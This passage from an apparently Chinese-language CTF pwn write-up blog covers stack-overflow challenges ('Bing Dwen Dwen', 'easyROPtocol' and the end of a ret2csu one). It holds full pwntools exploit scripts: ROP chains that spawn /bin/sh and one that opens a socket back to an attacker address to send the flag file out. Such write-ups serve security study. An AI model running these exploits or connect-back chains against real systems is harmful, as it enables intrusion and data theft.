class="hljs-string">&#x27;__libc_start_main&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(sys_write)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret) <span class="hljs-comment"># read() 修复puts_got</span><br>payload += p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]+<span class="hljs-number">8</span>) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br><br>p.recvuntil(<span class="hljs-string">&quot;///\n&quot;</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.2</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20750</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br>p.recv()<br>payload = p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>p.sendline(payload) <br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul><li>ret2csu的r12寄存器必须是指令的双重指针，一般情况下elf.plt[“xx”]即可满足；</li><li><code>_DYNAMIC</code>处存在_init和_fini函数的地址，且两者都不影响寄存器的值；</li><li>只要rbp和rbx寄存器设置适当(一般rbx&#x3D;0,rbp&#x3D;1),ret2csu可以一直执行下去；</li><li>分析gadget需要分析其入口和出口,尤其要注意push指令和pop指令;</li><li>目前一般的stack题目都需要仔细分析汇编程序，巧妙构造payload。</li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html">https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html</a></li><li><a href="https://www.cnblogs.com/LynneHuan/p/15890280.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF">https://www.cnblogs.com/LynneHuan/p/15890280.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF</a></li></ul><h2 id="Bing-Dwen-Dwen"><a href="#Bing-Dwen-Dwen" class="headerlink" title="Bing Dwen Dwen"></a>Bing Dwen Dwen</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li>file pwn</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter ./ld.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=be4181a2936fbcd06f4f74b4ca5635689a182856, not stripped<br></code></pre></td></tr></table></figure><ul><li>保护机制：只开启了栈不可执行</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 dest; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br><br>  dest = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">init</span>(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello,Do You Like Bing Dwen Dwen?&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;bingDwenDwen, <span class="hljs-number">0x200</span>uLL);<br>  <span class="hljs-built_in">memcpy</span>(&amp;dest, &amp;bingDwenDwen, <span class="hljs-number">0x200</span>uLL); <span class="hljs-comment">//栈溢出</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good Bye~&quot;</span>);<br>  <span class="hljs-built_in">close</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">close</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">close</span>(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显的栈溢出，但是程序最后关闭了标准输入，标准输出，标准错误，所以程序无法通过他们进行读写。</p><p>此外，程序给了所有需要的gadget.</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>为了获取flag,一般采用ret2libc或者ret2syscall，这两种方法都需要程序输出一些数据。</p><p>由于攻击机与服务器之间无法通过标准输入，标准输出和标准错误进行读写，那么需要创建一个新的通信连接用于传输数据。</p><p>为了减少传输次数，直接进行ORW，然后传输flag即可。</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br>&#x27;&#x27;&#x27;<br>@文件        :exp.py<br>@说明        :rop + 反弹shell<br>@时间        :2022/02/12 11:38:05<br>@作者        :sh0ve1<br>@防护<br>    Arch:     amd64-64-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x3ff000)<br>&#x27;&#x27;&#x27;<br><br>from pwn import *<br>import pwnlib<br><br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = 0<br>if REMOTE:<br>    p = remote(&#x27;node4.buuoj.cn&#x27;,27184)<br><span class="hljs-section">else:</span><br>    p = process(&#x27;./pwn&#x27;)<br>    libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>elf = ELF(&#x27;./pwn&#x27;)<br><br>pop_rdi_ret = 0x401356<br>pop_rsi_ret = 0x401358<br>pop_rdx_ret = 0x401354<br>pop_rax_ret = 0x40135a<br>pop_rcx_ret = 0x40135d<br>mov_rcx_rax = 0x40135C<br>mov_rdi_rcx = 0x40135F<br>syscall_ret = 0x401351<br>bing = 0x403700<br><br>&#x27;&#x27;&#x27;<br>sockfd = socket(2,1,0)<br>connect(sockfd,addr,len)<br>&#x27;&#x27;&#x27;<br><br>payload = b&#x27;A&#x27;*0x10<br><span class="hljs-comment"># sockfd = socket(AF_INET,SOCK_STREAM,0) AF_INET=2 SOCK_STREAM=1</span><br>payload += p64(pop_rdi_ret) + p64(2)<br>payload += p64(pop_rsi_ret) + p64(1)<br>payload += p64(pop_rdx_ret) + p64(0)<br>payload += p64(pop_rax_ret) + p64(0x29)<br>payload += p64(syscall_ret) <span class="hljs-comment"># socket _fileno=0</span><br><br><span class="hljs-comment"># payload += p64(mov_rcx_rax) + p64(mov_rdi_rcx)</span><br><span class="hljs-comment"># connect(sockfd,addr,len)</span><br>payload += p64(pop_rdi_ret) + p64(0)<br>payload += p64(pop_rsi_ret) + p64(bing+0x170)<br>payload += p64(pop_rdx_ret) + p64(0x10)<br>payload += p64(pop_rax_ret) + p64(0x2a) <span class="hljs-comment"># connect</span><br>payload += p64(syscall_ret)<br><br><span class="hljs-comment">#open(&quot;/flag&quot;,0)</span><br>payload += p64(pop_rdi_ret) + p64(bing+0x180)<br>payload += p64(pop_rsi_ret) + p64(0)<br>payload += p64(pop_rax_ret) + p64(2) <span class="hljs-comment"># open _fileno=1</span><br>payload += p64(syscall_ret)<br><br><span class="hljs-comment"># read(1,bing+0x1a0,0x30)</span><br>payload += p64(mov_rcx_rax) + p64(mov_rdi_rcx)<br>payload += p64(pop_rsi_ret) + p64(bing+0x1a0)<br>payload += p64(pop_rdx_ret) + p64(0x30)<br>payload += p64(pop_rax_ret) + p64(0) <span class="hljs-comment"># read</span><br>payload += p64(syscall_ret)<br><br><span class="hljs-comment"># write(0,bing+0x1a0,0x30)</span><br>payload += p64(pop_rdi_ret) + p64(0)<br>payload += p64(pop_rsi_ret) + p64(bing+0x1a0)<br>payload += p64(pop_rdx_ret) + p64(0x30)<br>payload += p64(pop_rax_ret) + p64(1) <span class="hljs-comment"># write</span><br>payload += p64(syscall_ret)<br><br>payload = payload.ljust(0x170,b&#x27;\x00&#x27;)<br><br>payload += p16(2)<br>payload += p16(10001,endian=<span class="hljs-string">&quot;big&quot;</span>)<br>payload += p32(0x7f000001,endian=<span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment">#  0x8B0976B9 0x7f000001</span><br>payload += p64(0)<br>payload += b<span class="hljs-string">&quot;/flag&quot;</span>.ljust(8,b&#x27;\x00&#x27;)<br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x4013FA&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello,Do You Like Bing Dwen Dwen?\n&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><ul><li>理解解决题目的困难的本质是什么，从本质上解决问题。本题的困难就是程序运行结束后无法进行数据交互，所以我们需要让这个程序可以与我们进行数据交互，因此可以让程序创建一个连接进行数据交互。</li></ul><h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://blog.csdn.net/WHACKW/article/details/46392455">https://blog.csdn.net/WHACKW/article/details/46392455</a></li><li><a href="https://blog.csdn.net/dearQiHao/article/details/102877786">https://blog.csdn.net/dearQiHao/article/details/102877786</a></li><li><a href="https://www.cnblogs.com/wyqfighting/archive/2013/03/06/2945651.html">https://www.cnblogs.com/wyqfighting/archive/2013/03/06/2945651.html</a></li><li><a href="https://blog.csdn.net/WHACKW/article/details/46392455">https://blog.csdn.net/WHACKW/article/details/46392455</a></li><li><a href="https://blog.csdn.net/mpp_king/article/details/80222304">https://blog.csdn.net/mpp_king/article/details/80222304</a></li></ul><h2 id="easyROPtocol"><a href="#easyROPtocol" class="headerlink" title="easyROPtocol"></a>easyROPtocol</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li>libc版本：<code>libc6_2.31-0ubuntu9.2_amd64</code></li><li>file pwn</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">31</span>-<span class="hljs-number">0</span>ubuntu9.<span class="hljs-number">2</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">8</span>d7cbb4be5d97a69c8fc905db176c3e2356e74ec, stripped<br></code></pre></td></tr></table></figure><ul><li>保护机制：</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure><ul><li>沙盒：无法getshell</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">A</span> = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x05 <span class="hljs-number">0</span>xc000003e  if (<span class="hljs-keyword">A</span> != ARCH_X86_64) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35 0x00</span> <span class="hljs-number">0</span>x01 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>xffffffff  if (<span class="hljs-keyword">A</span> != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003b  if (<span class="hljs-keyword">A</span> == execve) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">size_t</span> v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> chk_result; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( idx = <span class="hljs-number">0</span>; idx &lt;= <span class="hljs-number">3</span> &amp;&amp; *((_QWORD *)&amp;heap_array + idx); ++idx )<br>    ;<br>  <span class="hljs-keyword">if</span> ( idx != <span class="hljs-number">4</span> )<br>  &#123;<br>    *((_QWORD *)&amp;heap_array + idx) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>uLL);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;heap_array + idx), <span class="hljs-number">0x1000</span>uLL);<br>    chk_result = <span class="hljs-built_in">check</span>(*((_QWORD *)&amp;heap_array + idx));<br>    <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">func</span>(*((_QWORD *)&amp;heap_array + idx)) &amp; chk_result) == <span class="hljs-number">1</span> )<br>    &#123;<br>      flag = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = <span class="hljs-built_in">strlen</span>(aBengBuZhuLe);<br>      <span class="hljs-built_in">write</span>(<span class="hljs-number">2</span>, aBengBuZhuLe, v0);<br>      <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;heap_array + idx));<br>      *((_QWORD *)&amp;heap_array + idx) = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>add函数一次可以提交0x1000字节的数据，最多可以提交4次。数据的头部需要有一定格式才能提交。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">submit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">void</span> *v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-3020h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+3008h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+300Ch] [rbp-14h]</span><br><br>  v6 = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x3000</span>uLL);<br>  <span class="hljs-keyword">while</span> ( flag )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span> &amp;&amp; (!heap_array[i] || *(_DWORD *)(heap_array[i] + <span class="hljs-number">4LL</span>) != v6); ++i )<br>      ;<br>    <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">4</span> * (*(_WORD *)(heap_array[i] + <span class="hljs-number">12LL</span>) &amp; <span class="hljs-number">0xF</span>) != <span class="hljs-number">20</span> &amp;&amp; *(_WORD *)(heap_array[i] + <span class="hljs-number">20LL</span>) )<br>    &#123;<br>      v0 = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(heap_array[i] + <span class="hljs-number">4</span> * (*(_WORD *)(heap_array[i] + <span class="hljs-number">12LL</span>) &amp; <span class="hljs-number">0xF</span>));<br>      v1 = <span class="hljs-built_in">strlen</span>(s);<br>      <span class="hljs-built_in">memcpy</span>(&amp;s[v1], v0, <span class="hljs-number">0x1000</span>uLL); <span class="hljs-comment">//栈溢出</span><br>      v6 += <span class="hljs-number">0x1000</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>(s, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(<span class="hljs-number">4</span> * (*(_WORD *)(heap_array[i] + <span class="hljs-number">12LL</span>) &amp; <span class="hljs-number">0xF</span>) + heap_array[i]));<span class="hljs-comment">// ?</span><br>      flag = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  v2 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, s, v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Done.\n&quot;</span>, <span class="hljs-number">6uLL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在submit函数中，最多可以依次四次，且每次都在上一次复制的结束位置开始再次复制，但是数组s到ebp的偏移只有0x3020,所以在第四次复制时会导致溢出。</p><blockquote><p>整个过程可以视为TCP要传输的数据大小超过了MSS，所以需要对数据进行分片，且每一个片段都会有一个TCP头，只有TCP头正确才能提交进行传输。</p></blockquote><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> check(<span class="hljs-variable">__int64</span> a1)<br>&#123;<br>  <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)a1 != <span class="hljs-number">0</span>x766E )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>x28B7 )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( !*(<span class="hljs-variable">_DWORD</span> *)(a1 + <span class="hljs-number">4</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( !*(<span class="hljs-variable">_DWORD</span> *)(a1 + <span class="hljs-number">8</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( !*(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">14</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">18</span>) )<br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">4</span> * (*(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0</span>xF) == <span class="hljs-number">20</span> )  <span class="hljs-comment">// 0x5</span><br>    <span class="hljs-built_in">goto</span> LABEL_18;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">4</span> * (*(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0</span>xF) != <span class="hljs-number">24</span> )  <span class="hljs-comment">// 0x6</span><br>    return <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">if</span> ( *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">22</span>) == <span class="hljs-number">0</span>xFFFF )<br>LABEL_18:<br>    result = <span class="hljs-number">1</span>LL;<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-number">0</span>LL;<br>  return result;<br>&#125;<br><br><span class="hljs-variable">_BOOL8</span> <span class="hljs-variable">__fastcall</span> check_sum(<span class="hljs-variable">__int64</span> a1)<br>&#123;<br>  char v2[<span class="hljs-number">23</span>]; <span class="hljs-comment">// [rsp+Bh] [rbp-1Dh] BYREF</span><br>  unsigned <span class="hljs-variable">__int16</span> j; <span class="hljs-comment">// [rsp+22h] [rbp-6h]</span><br>  unsigned <span class="hljs-variable">__int16</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-4h]</span><br>  <span class="hljs-variable">__int16</span> v5; <span class="hljs-comment">// [rsp+26h] [rbp-2h]</span><br><br>  strcpy(v2, <span class="hljs-string">&quot;fakeipheadfa&quot;</span>);<br>  *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>] = v2;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">5</span>u; ++i )<br>    v5 ^= *(<span class="hljs-variable">_WORD</span> *)(<span class="hljs-number">2</span>LL * i + *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>]);<br>  *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>] = a1;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">2047</span>u; ++j )<br>  &#123;<br>    <span 